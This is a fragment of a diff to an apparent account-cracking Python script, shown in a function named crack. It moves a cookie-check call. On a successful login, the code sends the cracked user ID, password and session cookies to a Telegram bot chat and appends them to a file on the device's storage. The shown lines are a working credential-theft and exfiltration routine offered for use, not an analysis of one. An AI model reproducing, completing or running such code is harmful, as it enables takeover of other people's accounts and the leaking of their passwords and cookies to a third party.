@@ -5245,12 +5245,12 @@ def crack(idf,pwv):
 ﴾𝐕𝐈𝐏﴿﴾𝐃𝐀𝐓𝐄﴿ = {tahun(idf)}\n
 ⋘━━━━━━━﴾𓆩𝐋𝐈𝐕𝐄𓆪﴿━━━━━━━⋙
 ➺𝐌𝐑•𝐃𝐄𝐕:@R_A_J_Y @K_L_D'''
+				cek_aya(kuki)
 				requests.get('https://api.telegram.org/bot' + str(kld) + '/sendMessage?chat_id=' + str(sos) + '&text=' + str(rajy))
 				statusok1 = nel(rajy, style='green')
 				cetak(nel(statusok1, title='OK'))
 				open('/sdcard/𝚁𝙾𝚁-𝙾𝙺.txt', 'a').write(idf+'|'+pw+'|'+joined+'\n')
 				requests.get('https://api.telegram.org/bot' + str(kld) + '/sendMessage?chat_id=' + str(sos) + '&text=' + str(rajy))
-				cek_aya(kuki)
 				break
 				
 			else:
